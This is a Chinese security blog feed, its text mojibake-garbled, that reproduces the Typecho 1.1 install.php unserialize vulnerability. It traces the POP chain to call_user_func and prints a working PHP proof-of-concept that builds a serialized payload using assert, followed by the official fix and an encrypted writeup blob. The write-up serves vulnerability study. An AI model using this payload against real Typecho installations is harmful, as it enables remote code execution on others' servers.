    <content type="html"><![CDATA[<p>[toc]<br>ä¸Šæ¬¡å›½èµ›æœ‰ä¸€é“è¿™ä¸ªé¢˜ï¼Œ<strong>baby_serialize</strong>ï¼Œçœ‹äº†å¥½ä¹…ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œæ„Ÿè§‰è‡ªå·±ä»£ç å®¡è®¡èƒ½åŠ›å¤ªå·®äº†ï¼Œäºæ˜¯ä¹æƒ³æ‰¾å‡ ä¸ªcmså®¡å®¡ååºåˆ—åŒ–çš„é“¾å­ï¼Œäºæ˜¯å°±æœ‰äº†è¿™ç¯‡ã€‚<a id="more"></a><br>æ‰¾çš„æ˜¯typecho1.1çš„é‚£ä¸ªæ¼æ´ï¼Œå‘œå‘œå‘œå¤ªèœäº†ï¼Œå› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡ï¼Œè¿˜æ˜¯ä¸€è¾¹çœ‹å¸ˆå‚…åšå®¢ä¸€è¾¹å®Œæˆçš„ï¼Œæ­¤å¤„è†œæ‹œP3å¸ˆå‚…ã€‚å› ä¸ºç°åœ¨çš„ç‰ˆæœ¬æ¼æ´å·²ç»ä¿®å¤äº†ï¼Œæ­ç¯å¢ƒè¿˜æµªè´¹äº†å¥½é•¿æ—¶é—´ï¼ŒçœŸçš„å¿ƒç´¯ã€‚</p><p><img src="/images/typecho1.1/20200903190745.png" alt=""></p><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>æ¼æ´åˆ©ç”¨çš„åœ°æ–¹æ˜¯åœ¨<strong>install.php</strong>ï¼Œè¿™é‡Œåªæ˜¯éªŒè¯äº†ä¸€ä¸‹æœ‰æ²¡æœ‰getæäº¤finishå‚æ•°ï¼Œè‹¥æ²¡æœ‰åˆ™é€€å‡ºï¼Œæœ‰çš„è¯å†ç»§ç»­å¾€ä¸‹è¿›è¡Œï¼Œå…ˆçœ‹çœ‹åˆ©ç”¨ç‚¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php else : ?&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    $config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));</span><br><span class="line">    Typecho_Cookie::delete(&#39;__typecho_config&#39;);</span><br><span class="line">    $db &#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</span><br><span class="line">    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">    Typecho_Db::set($db);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠä»getä¸­æ•°æ®ç„¶åbase64è§£ç ç„¶åå†ååºåˆ—åŒ–ï¼Œçœ‹ä¸€ä¸‹getæ–¹æ³•çš„å®ç°ï¼š</p><p><img src="/images/typecho1.1/20200903191942.png" alt=""></p><p>è¿™é‡Œç”¨äº†ä¸€ä¸ªä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¦‚æœcookieå­˜åœ¨å°±ä»cookieä¸­è·å–å€¼ï¼Œå¦åˆ™å°±ä»POSTå‚æ•°è·å–å€¼ã€‚è¿™é‡Œæˆ‘ä»¬åªè¦ç›´æ¥é€šè¿‡cookieæˆ–è€…postä¼ å…¥æˆ‘ä»¬çš„payloadå°±å¯ä»¥åˆ©ç”¨æ­¤æ¬¡æ¼æ´ã€‚</p><h2 id="ååºåˆ—åŒ–åˆ©ç”¨é“¾æ„é€ "><a href="#ååºåˆ—åŒ–åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="ååºåˆ—åŒ–åˆ©ç”¨é“¾æ„é€ "></a>ååºåˆ—åŒ–åˆ©ç”¨é“¾æ„é€ </h2><p>å› ä¸ºè¿™é‡Œæ˜¯ <strong>unserialize</strong> å‡½æ•°ï¼Œé¦–å…ˆæˆ‘ä»¬è‚¯å®šè¦æ‰¾ <strong>__destruct()</strong> é­”æœ¯æ–¹æ³•æ¥åˆ©ç”¨ååºåˆ—åŒ–ï¼Œç»“æœçœ‹äº†ä¸€åœˆä¹Ÿæ²¡æœ‰ä¸€ä¸ªèƒ½ç”¨çš„ï¼Œç„¶ååˆå…¨å±€æœç´¢äº† <strong>__wakeup()</strong> æ–¹æ³•ï¼Œä¹Ÿæ˜¯æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ã€‚<br>ç„¶åå¾€ä¸‹çœ‹ï¼Œnewäº†ä¸€ä¸ª <strong>Typecho_Db</strong> ç±»ï¼Œçœ‹çœ‹è¿™ä¸ªç±»çš„ <strong>__construct</strong> ã€‚</p><p>db.php 114-120è¡Œï¼š</p><p><img src="/images/typecho1.1/20200903192930.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥æ“ä½œï¼Œåœ¨è¿™é‡Œå¯ä»¥è§¦å‘ <strong>__toString()</strong> æ–¹æ³•ï¼Œç„¶åå…¨å±€æœç´¢__toStringï¼Œåœ¨feed.phpä¸­å‘ç°å¯åˆ©ç”¨ç‚¹ã€‚</p><p>feed.php 258-259è¡Œï¼š</p><p><img src="/images/typecho1.1/20200903193610.png" alt=""></p><p>è¿™é‡Œçš„ <strong>item[&#39;author&#39;]-&gt;screenName</strong> å¯ä»¥è§¦å‘ <strong>__get()</strong> æ–¹æ³•ï¼Œç„¶åå…¨å±€æœç´¢<strong>getæ–¹æ³•ï¼Œç„¶åä¼šåœ¨request.phpä¸­å‘ç°å¯ä»¥rceçš„</strong>get()æ–¹æ³•ã€‚<br>é¦–å…ˆæ˜¯ </p><p>request.php 269-272è¡Œï¼š</p><p><img src="/images/typecho1.1/20200903194148.png" alt=""></p><p>è¿™é‡Œè°ƒç”¨getå‡½æ•°ï¼Œè·Ÿè¿›</p><p>request.php 295-311è¡Œï¼š</p><p><img src="/images/typecho1.1/20200903194308.png" alt=""></p><p>è¿™é‡Œåœ¨æœ€åä¼šè°ƒç”¨<code>_applyFilter</code>æ–¹æ³•ï¼Œçœ‹çœ‹è¿™ä¸ªæ–¹æ³•</p><p>request.php 159-171è¡Œï¼š</p><p><img src="/images/typecho1.1/20200903194421.png" alt=""></p><p>å°±ä¼šè°ƒç”¨è¿™é‡Œçš„call_user_func()æ‰§è¡Œå‡½æ•°ã€‚è¿˜è¦è¯´çš„ä¸€ä¸ªåœ°æ–¹å°±æ˜¯ï¼Œå½“æŒ‰ç…§ä¸Šé¢çš„æ‰€æœ‰æµç¨‹æ„é€ pocä¹‹åï¼Œå‘è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œå´ä¼šè¿”å›500ã€‚<br>åŸå› æ˜¯åœ¨install.phpçš„å¼€å§‹ï¼Œè°ƒç”¨äº† <strong>ob_start()</strong> ï¼Œå½“æˆ‘ä»¬åœ¨æ‰§è¡Œçš„æ—¶å€™ä¼šè§¦å‘åŸæœ¬çš„exceptionï¼Œå¯¼è‡´ob_end_clean()æ‰§è¡Œï¼ŒåŸæœ¬çš„ç¼“å†²åŒºè¢«æ¸…ç†ã€‚å¿…é¡»åƒä¸€ä¸ªåŠæ³•ä¸‹å¼ºåˆ¶é€€å‡ºï¼Œä½¿å¾—ä»£ç ä¸ä¼šæ‰§è¡Œåˆ°exceptionï¼Œè¿™æ ·åŸæœ¬çš„ç¼“å†²åŒºæ•°æ®å°±ä¼šè¢«è¾“å‡ºå‡ºæ¥ã€‚</p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªåŠæ³•ã€‚ 1ã€å› ä¸ºcall_user_funcå‡½æ•°å¤„æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®æ•°ç»„æ¥æ§åˆ¶ç¬¬äºŒæ¬¡æ‰§è¡Œçš„å‡½æ•°ï¼Œç„¶åæ‰¾ä¸€å¤„exitè·³å‡ºï¼Œç¼“å†²åŒºä¸­çš„æ•°æ®å°±ä¼šè¢«è¾“å‡ºå‡ºæ¥ã€‚ 2ã€ç¬¬äºŒä¸ªåŠæ³•å°±æ˜¯åœ¨å‘½ä»¤æ‰§è¡Œä¹‹åï¼Œæƒ³åŠæ³•é€ æˆä¸€ä¸ªæŠ¥é”™ï¼Œè¯­å¥æŠ¥é”™å°±ä¼šå¼ºåˆ¶åœæ­¢ï¼Œè¿™æ ·ç¼“å†²åŒºä¸­çš„æ•°æ®ä»ç„¶ä¼šè¢«è¾“å‡ºå‡ºæ¥ã€‚</p><p>è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œæ•´ä¸ªåˆ©ç”¨POPé“¾å°±æˆç«‹äº†<br>pocï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Typecho_Feed&#123;</span><br><span class="line">    private $_type &#x3D; &#39;RSS 2.0&#39;;</span><br><span class="line">    private $_charset &#x3D; &#39;UTF-8&#39;;</span><br><span class="line">    private $_lang &#x3D; &#39;zh&#39;;</span><br><span class="line">    private $_items &#x3D; array();</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;_items[] &#x3D; [&quot;author&quot;&#x3D;&gt;new Typecho_Request(),&#39;category&#39;&#x3D;&gt;array(new Typecho_Request())];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Request&#123;</span><br><span class="line">    private $_params &#x3D; array();</span><br><span class="line">    private $_filter &#x3D; array();</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;_filter &#x3D; array(&quot;assert&quot;);</span><br><span class="line">        $this-&gt;_params &#x3D; [&#39;screenName&#39;&#x3D;&gt;&#39;phpinfo()&#39;];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$config &#x3D; array(&#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,&quot;adapter&quot;&#x3D;&gt;new Typecho_Feed(),&quot;prefix&quot;&#x3D;&gt;&#39;123&#39;,&quot;pop&quot;&#x3D;&gt;&#39;123&#39;);</span><br><span class="line"></span><br><span class="line">echo serialize($config);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo base64_encode(serialize($config));</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œï¼š</p><p><img src="/images/typecho1.1/20200903194950.png" alt=""></p><h2 id="ä¿®å¤æ–¹æ³•"><a href="#ä¿®å¤æ–¹æ³•" class="headerlink" title="ä¿®å¤æ–¹æ³•"></a>ä¿®å¤æ–¹æ³•</h2><p>è‹¥æ˜¯ä¹‹å‰çš„ç‰ˆæœ¬åªè¦åˆ æ‰install.phpå°±å¥½äº†ï¼Œçœ‹çœ‹å®˜æ–¹çš„ä¿®å¤æ–¹æ³•ï¼š</p><p><img src="/images/typecho1.1/20200903195426.png" alt=""></p><p>å¢åŠ äº†å¯¹æ•°æ®åº“çš„åˆ¤æ–­ï¼ŒåŸæ¥finishè¢«åˆ æ‰äº†ï¼Œè¿™æ ·å°±å®‰å…¨å¤šäº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;br&gt;ä¸Šæ¬¡å›½èµ›æœ‰ä¸€é“è¿™ä¸ªé¢˜ï¼Œ&lt;strong&gt;baby_serialize&lt;/strong&gt;ï¼Œçœ‹äº†å¥½ä¹…ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œæ„Ÿè§‰è‡ªå·±ä»£ç å®¡è®¡èƒ½åŠ›å¤ªå·®äº†ï¼Œäºæ˜¯ä¹æƒ³æ‰¾å‡ ä¸ªcmså®¡å®¡ååºåˆ—åŒ–çš„é“¾å­ï¼Œäºæ˜¯å°±æœ‰äº†è¿™ç¯‡ã€‚
    
    </summary>
    
    
      <category term="æ¼æ´å¤ç°" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="ååºåˆ—åŒ–" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€ç¯‡writeup</title>
    <link href="http://yoursite.com/2020/08/27/Writeup/"/>
    <id>http://yoursite.com/2020/08/27/Writeup/</id>
    <published>2020-08-27T09:56:29.900Z</published>
    <updated>2020-08-27T10:27:10.552Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="ä¸å¥½æ„æ€ï¼Œå¯†ç æ²¡å¯¹å“¦ï¼Œåœ¨æ£€æŸ¥æ£€æŸ¥å‘¢ï¼" data-whm="ä¸å¥½æ„æ€ï¼Œä¿¡æ¯æ— æ³•éªŒè¯ï¼">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="1c0d2dc4ddff4152de1322bd17c9148f755fcabefa5fa4e882563634bcd5892c">604af0917d593ad3ddb8b0fa3ca7e41c284dbe750053458bec4b21cca5e89989c045002f7a4e9aaa0b4577fc84523cefeb0f15263640f92bce03f6d78ccacccd3163899594823cfe962797587f22d817696358651a1ddc50ecd5dea03f6fad3ab03056cc8c71b745d5b5155f86ea1d2adf294df649d6267b2ea64da801dc65e4e580c14a682201bf8b8f408e8e34ac4cbd316732c8c4719e90a2c4532abbc4022c190a4206826aec9df2416e01db2d87e3ddd81b136092a6f1d79c2cf851e4e62c28897b6887465c6e6a57563fdd93669d35619fbc9ab29876ae1d17024a01d82b3b3400282450b6646ffd6e819e7d4be3ddfe0782887f626e9b62b556aba217194f583823c607bac4eed2673ddff0d4ca83376a24d9362356192cff45b55646c91a7ca37ef9d6e3e3ebbe9dde11d256f62500f356aabc1bbf2495377af323e1975d9834423da16c096ec4c044e41b3fe4f61f1bc3a0cae1a81c3cd1faf2bb2539bb5138796ac8e9fb0ac7d663f0de573aead5e16519ecec346de9c67f39d906935ada436826b8dc6b5abfe4f0138aef5c66a1a44608192775c26f02cf554fd02be8e340dcc55c32e35fbc1b9846f055d7e73e3e555b005274c846202ec82a71e3abeede955c7eebc694d8dd58f5c6ef4e89873997a0e7d52ca052128cf4a799c6ad014493c9c9ea9d3fcc6d484a0a438bc51e415ac139656a6d9e3d29d770d5b8b30a2850e6ec928cd8f7cd08c7426cc6210afe157c42164e715bfd22bb6b80ba0463332a25edc0a42de5025d75c68db9042a46e6503901aa1289553135f2cdd4315988db0f7aed952411191da2781435e4030165c1843f8f45fc7e15766b4e9d92be93f2c1030d39317e3c84e5401fe1277b8dfca7f7275e1e08f13f85e7b1c9e85135c2405fc05413d58f9dbd8f0132f9bddb6970f9c30d5ab8c99dd200ff837733fcc1d058072d2e2aad4046d44126fb3a3d2d0cf0aa6488a4a3d9601dd916bc6881560b088d6170a57eb7199c0ba8314aced5a1b69ff51db40f29032742a3171d53c5f373a28aeb431d4d17e8907c78aa67ae21d332bb51f7c9aea75c2e1bef41f7971638dcdf94b0508520702016530354966e9866e123778a20ca7eedfc259e69e82c17e84e609f8eb32a43e68f1e87eba6b7240e589687516556591f297fe2b0fd93108600bdbeed659debb18186cfc160f73d8d40afbce8b8225773d2bcc8dc7e6d976c0fb7b01853d7afa2633538cb71bbb06627e30ecec9bf4426c64e80362f4bd36276443efa4721671c704f48b7d3a86ae97d0a96726d87df460b34ddda2194603e1727cfd5639987662b22be5f073986ce12895a8619ea08e8e84935510911dc3e319a1b1da7f05e5523fe5d7a7b3717ff77201f205e1fe92b6fd94211345245a508c249c7f9f6da9b3ff42eef3d5ef40e2e30a24ba39ee8a6ae7849df10b56f66ace01d55ae4da3c8a6ad51af86f0c835bf5b87dea52835cd4f3f7831f61482b775512ee0cb34aba40bba9b453a2f40ec8093f0692a85ef491c46edc912d89c97c209d40b0f62b380b29efbb52417936f2b1c11df8173f783f54523d641abfcc788044c8a2df51f7a2bc71e0058b730ac259208f7b4a82718bc471355944aec69fb07dc1c76df9ed7902d30d1714bfed247bc295ed69edb856d1d72f3b3a9704848756bfa1980295be0a5888ee9178ae746bea8e6331708061e378bc5abce53c12134bb73aecd8204192aec7e6f4b6d01313270d8a48f3e70ceaef96166f90f2c8cd4596265799871256db12c1e6734a81feadf51cdcbab043cba490063e431037508a1e7454e991e87f7999bdcb51d378273728856ec908dc6626a09a990f26a2d4d0d48e54a3a0b139cff8123c92420a07ad28465cad5b2565cce9bdf6ecfa1d95406541612221f8bfeb90824aaf4493fa781896bc4e8705e0c1570ec3b78482c231072a7b94c9505fec0d76052beef2b787d31c5fb155a7031776e2738f1381e2799500073f188e0cd25dcf3b58552765993e02359c65480f53f5e49eb7cf7d1a74d35003e3d5e13fab9d4825bef34e9b8248fee839fa99b8941530f6d3c0f74cb69d9756e07e1bca75230942932dd26041efa40013206c7858c801003d8cbbc685f64bbdea6f0600565a338edc1c17537a3791070e8786a5715e60581942949fec8eb8436a01dfa7390aa233dbc04928d65dd6454a9c370da8a8ae256c312b0df46621c294affefe6332e61c8885ab01297762c97325bae1600e5aa9637137528ac2b9d0e24e74bb1e9303b73e08b44966166c06e0d4ebc7b7e859e5bf709d2dd23a99eb80b13e437c52519a268ead36e3ea151376ea0f2264dffac2428e537992f51f7e183614178bd2b13b68ab01b9f9dbca6ba1f3dff36352e53e7d3bb5dd3475c6b0c3afc31db93ed062bb0f6b66e902198a914c6b4ca92900f67619283885be2b3b4772dacf5a9e5dc12c539294eef0e9a6c0c9a8f2cd467b15201675ef55f0096a3403c8c3bf96f2edd78dbe512a02084dc52fd807f2517c18ba805cbd74b34564c6ca5182e21c54909a69ae7e6ada0f582766297f9fbdf7a2433ef8a3c1d667a6716e386f0c9523ca31e7276385aa81761e9b4d84380e6ead41bd9ac493403e754839941270c17850249370ad2250ae1f2468c3a9465e8210a59d236b1ae1c0f797cd0dc45d45a8c3ac2cb3fb726ad2d1925b918308b3e044ce70ad6d41d7a85bb4937daf8bc5b4b28d388e80359cc0e09a06d74d448927d54170785550e27ac434a20d7820aaf1a72f6bfd9c47010cae7d5fc4e28acaff98ca5e3199fed353e08b4642c12da927f1314340aea8699c7cf59cd83364497de9141c3ac9e0be4cf76096431e7c7307a1d1fb0ca502b94b64f4f5a9b52742709b429ed935c74ef1fbd92e13fd6f54c0f64afa1e895009b23db3299f4f3d6b84b31f5d466ffe9fc934861af6113f2f63dc3014a8c596bec8b916f369362806d61ec67d86f0ff7da1991971ffdd06821b29b4e99942cbb3e404f0579f1f68e9602ba367309780ba5334e09f4c752d22b1817cca063897de0a22484a9d8bf037bf18607652bd7db617683739af362b92842b3076855e694cc105ea4d0dbeedbce5076b825429adb352d8230bfc191c1418eb07dd713e0b9a5dd55f39aef1ec04d11db1eaf1040cebd9a40b04669c5c9322bd25e467139abeaf1348ed9f2515c0d1b321082fa18147101a9e9f1212828ce8f450364f2b7a8931b4262ec78a8ae310d737f2b12af98bd88a47d782eddcaa148b4455d1aaed8fb24ee83b8ba5ae8a9d0420ac936f289c0948f6aac598e8830e1cbaa0a807a64cacf5047f5f45cae095b9aa0dcabbe92d4a599c98a988474cb8fcda0b13e28ea06674bac52a33cfff549fe44eff63765c43b8816f4b717abed39f9862569a3ded06a069cc771030eb9a041d3ec6706b217663a091f5969a5d8febbf89a34cd3f3727d6afade5ab5b2c2fa592d15c22ea586dedc86213ac62c1b429bf7583c56ed720e51d849b0e4041df1c89d6eede25fb2ef60197b433b240827448eb66ba02207a015be4a75793f16c9e8971c5a48b16e311d0b3ace3d5c8e7c977bb2f8a84d60ad7525e4818efa63cc0f35b72f65bc989e9e9b8a163b6a3b0851e39666e50d367be55b83131a10c7d73844882506fdcaf28cc2fafe66c6f42ae6315018409559a0fb0dbc17b8657a8fe09786450273fb0a2443b9f021becacd3bcd5b1fb4a34e1960a20da373297e5792ea1c52fcd541e0c0e9b1186244c2596d476a0aa3ef68f067fd126d2d9c668651c08fd2873497fa257cd507af39246789a1e90a6abf3d2fcc8ffb3adedb7b9ae47a90cf53c02944c05cfc90e5eb1d54b9b55997ea8a0279b9784e2c73c0785dc95523b8ec477d51989f7cec387e3bc56e9a181b1d007fed341f66ad651d66a3bf5e6286f5ebcc4403cade38150ad35eb9bc79ba44702246e761f3ec22c628eed86344d0d306eb42eb5505884dd191a051cc747b10278629868ad447bc939af619bd426a953911137e7c42a522fc8ab8598a8cf834e7ea7d95fa35c96ff20c9e676909c8b8e93d44658513ecf2bc5308a2f81f6804744e824a9b5732220f67969027e2071d4e9596f3a3668c0429cd92ad303774fcc8a53d08bec61fc64fecd471315725e3c153c38e08e356bf5bc849b799f3a5459dced53b166b7c6d8febb81cdea8d5f2326603fce1a345819af0659717acc2ed121f7b06c12becef3bb4dd65ec3b41168b7e972d270d6d6d63e9206ed0e9e78da482ad3281ed4044b5f64b9377bdadb300de04d7eae577cb61002a384630fffcf78be9ab64396f704aa309eb14bf96c9aa0db8d117b45e80524d7b626ed90b66496e103a945ed1833023ca77300650c23588dcffe0e90d89c5f4af9fdcb5dba44a5339125e41bfe4ce38f094f2848c9d43133672933991ceb3d2422cec5315062bf080b8ce61b66f19ff64990cb4c157410d9d5801ec780ad7c661ad318bccaba34aa84e9a748bc3c967cb096bd8285c289bf9de7837c9f87a1efab05d80dde4a15bdfb76b9a3287802783c091ecd65dfdef92ade8dc348c008728db2c19536ad5a6522b06998dc9e1b7f3545b5c12ada380b9841e0164eeccf8a04666a684399e26568a73e9dc8562168bb880a181a0b4939104afba0e4c41430146471e9d25c5a7e99e013226e0465199151bffeca6c0511e3dc6c5434663f2699320e5c1b3c6673bc756daaa956a97233214dad7d01b61b5ad563cf6e41cbc427ef65b396bb678e210ad9290e289d186e43cc9ebc328b8f159736ba6f7a2d3baa134871c27bd10a0e0c824b68407b437e51d4897e1008ec27317fc45d2e1c2cdcaae975f52a3f70e0165c4dfeb775dc16cb4253e053eb38743fa6ab41eddd698c7cdea3218cb7e82cbcd993f84e2c8733275d6c1d47131e3ca5331d6735a9265d356c73596c1ef9ba1e70aec1c353d7149fabafb76011afe584505210c97f8e98821ea9414caebac2acddff315159d3a2a06c244d15dc9febf9f7275f2cf24d27359aaccc54f1815fa9df625ab19d75f560e0ff3fb05831bc3cbcc0f95f1f487c28075fb440b15de78b4404766d19cefdecf56f0899b034844edb8d9f5e9008332f18246557ec68f0c16349e1dcc0d6748340f8bd1a2d39089815cdc1beab3a7434679c92dc82fec3bcf4df631b527020d7e4c790c97cde6c3cb974f6a61f0bc6c93628150b16182e2a2270b8c68c455de781729fc0b95048ecdabdf32a986ccbecde7270f866fb1570514a8c3a8752377434cfb0e7a34581bcfb035ba28b62a542edda43fdc81dd24db9859039cb982ec70c892c2eb3d61345cf2de3520742cb9e2fd17557fd5ea75bb76d0da09b652edbf5d1585075eaa4dbe0e1797ca498f9207447c66d346e17471c46c2e5946162da870cdd8604a11fcb5325557ab0dab41491ec17de9dba7bc81495acc09f295c1b0921fa5b0b9ad1f9ecd1ee90588e32dfaeffa930dc50f428a778a344b81067abd0d71875e2bda88fc0a795b3c07895fb614951169fbff620d727cf208f57a14ed4051a7d8710340e926a3eb8d840bddf1ae8dda498a1b3a925e43b656ba61ff7734bf80ca8e8e79d912e2f772a820c908869097b3fb82b3808f3dceb978bbf8f3cd30cc5dbfef674297a51beaf1384e384217dcc6cf3d79081e74154e02e4c4e204b0aab451fa1afcb64385269fffb7f617ff0d977960e539a1ea7802936b8d0c62c5356b052fa40493ea091795c70ddb48875cb63b99b39ba615033296405f5636db5a6ad0e83cb784dff7778ea5ac21f4b2a5d08bc3d8aaf77f7def0fa9b8d884358fe36388e862f1e1e82451f0a81ba6963dec89fe7c397a97794011bda8b9d5042c15d866819c1bf71ec2d2f6b97fccca147e1ea472cc920772cd1ff5e163e2406d53556f33d76cb4034d80fa0f29ad7b2ebce1c03ad36543ba89529d43ac19c88d69bb7eb5554fde12cb970be56c3d8fc222a34d164e2211241604e618fd70cc35e1d657c597327e21c2e9b378d124829f9cca9321380726d5cd096286f85c6b8eeb73ae24f7c5f1d1b9b331c08313cddc83e480fd4b9bf2e0f42c599f4630328b925e4ce6834f7d14a35752fd330a4a50d57163fd408cc2e1035c0717366212501636ef1a7afba6e83ad60e66ff2b3c2b438e532244cf7b067d26d8385ab2561dd19d5f7f866510245b45299d6bbd61957d4ed79d95267f78134ff85c22622a67a3cc256800bc2760ea61843cb7d450a4ad20cc5877c87544578d6857aff2c9d66dd7ea2ac5f6465f392bdee84f4c04a2a2700fe4bad42f49eba147e48447cfec4e9f18eed3b2bf499fadd1e30eeb6bd9cf8eabdb99ba1d26987578f9a56c43c7115be4daddfbffac1a127e7345004ad67eb4f6deae7939a879179cdb04c68263af28586092c37193115730becfeef1ff2f3f4ecad89af3c00b3cda044b73ad094f6658f505aa04756c85e3b62fbe1d545636fbd6f30ee03f07d166bed5e32d72b67b20ca0c2c1169ce3c50fc0086799537aff0c8bffa8b4f526b70868aa686409ea1f2f60b9b3863ef50851a7900b4c6208d88d50e2863a2c78a8269bc3ac6a8ff03414867d1d14f4c0af6d652d1324f096d7f51d4e0c3a28b962a34ff1d52e46462f896aa2006854675fe176e3ac63401a91d0ba908f0c7d8b7ca0f2bac973ccef272349861a270b0108e073532a161965054cd1a43fed01614c4be41c40e28054508eaddb3b811cfa2125d8b957a3e270800e55b917258b77d923d39062b9c696865d0c84956ef6c26239abb0948f8e9844f90b15f5987d90c5ee71e63198e3f669bf73ab8c766ec2c4ff2550d10e6b5aecbaf36d215e459bb4086bc2a9b83759f73714b4e07eb9fd56ff92cf580cd7d7628dc3d68573ac0a80199cc89b741c169b2532b5aaa1ba23f9fdd5a1e83690aad5253b039210c627827033b418ae6188ed83793ed02ed5a1ebe2004059562b7a1dde01e2ed0cd60f7a238fbaedd87ae813bfcf8df3666c7b4b15c22f828e528c802a15e2141dca4be693b4b1366e74c92074cf68d8b2a1ab2bca2c19c413566404f90a926bc9d3578f64f21f52adc4e5ee6401dc1920996a506d34e593d6fba63e6b2e1da652bacb20c9d330206e133e92d37d492622bf682017dc4be15756293725a5711d70d4c04ab9cd66050063fd504c3b219ed15303ba86e83e684ca6e6d60efab08d55fd3bfbebbe0bb35dc24b8a5fa3c37010f02f610e8cb7aafa792ab0a57cfdf93a7caefabc957ec5de8d648d5232f54690729b28a365db76b47a7635327771ea1cc9eb5a5c4ef1eb59854b1c37b9d2025dfc08a9526ec06f3f9f2293e72101970f9b33ed13a3377136997239c8e65c11f235b1cf3edc09f91b6a0e79196a07b9d24042ce2a95d1d8afd83d1cde8ef1002ad3171a3b865ca4d2f63640f1b8c7566420fc8209135286607b5c5b160ad638c7d408918f4612659ae60c33e117ae3f26e2b67f7b35b74fa7b74dfaef423abadb260e4a333ecf300862c2bbc83c75d2f4d3a5a913809e337a0f28c617589184a0da5f1d8a3cdf19e64d25c5019b4bed7154ca286aa8d1a6a11882590081e2c5adc5bb3b4e5b198822d99d2c2b453e4df6d121c7471ee3242c18b883449de1435a64b78506fa4cd59c065b0493ccaf80afaf33fb109e422b49ade07aa4766f31355bfe7b2caeee35c1426e1dea473aef35a8e27b55170d87eeb9a2ccc221bc798144400032da7689c4c73c7449c64c64cd43182e86680cf6a8860df9c629f2a89d1200c3d26d7cd828a12efd70ae9fc26c95eda0cd779e6dd13dd3acb457c4bf4c35229ff6f478bd135a63db0f6e3d58967d5319e56643695b36b75f1e716806fda8ffae6b61498848fc26ed77de4d270e60bb5ac4ca97713e0d8fa19903e4392cc03fbf37b807304830b020db3b02741e3ac62317e1becdbae888f0a78b0c8b1720fe9e1c116e6670f5d75d539388cf110d2dcd68e8f050f2ea433dba0baa2762042374308b8b8dc738cc072ba0be960f460535e8af4d1d84c0ba6589788f15fb9d3ab2ef9b6fb14ed97ec9e715cbb360fedd5bbc6ca2436509efd6112755ebe13a7c1075ebb6d1df2f574e024d458db30799332a6930b4f991328025e6e3b28082fba95bd9c71b411348a7813dd53128fc16b1360f960bd503b708c773eecf85a8ffcda3cd57356589685468bb4161d00a84528332ec9065db82a32095bfb1d5aab9d36282486d55a7945a81b5e8f3bff9760c7115b0aaf5d8c028180e44526e4d6db5a15cea2e0e10d3859da7ff14a87e59d7cfffde985aca6a10cd85ca281e5726ffc55699b478774bebaa0b47bfd79b4c46fafad995f7580152c0c661a36f556c0f744e65e6da6ad2290fb1f39b2ca89674e2bd2bfed6785964267716d6c91394014bb99d26c343fcae2453807c8eaae1276ecb6bab23e50d6c096e33d2d4cbaf9fc9031add9a136a26ade43f1710590ab5d0b7d6fec4ba7b2a7d95df0b0389fa1cb84d1e3efb